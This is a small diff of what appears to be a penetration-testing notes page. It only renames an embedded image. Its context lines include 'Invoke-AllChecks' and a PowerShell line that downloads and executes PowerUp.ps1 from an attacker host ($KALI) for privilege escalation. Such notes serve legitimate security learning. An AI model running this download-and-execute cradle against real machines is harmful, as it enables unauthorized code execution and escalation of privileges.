@@ -31,7 +31,7 @@ Invoke-AllChecks
 <strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/PowerUp.ps1') 
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (3) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 
 
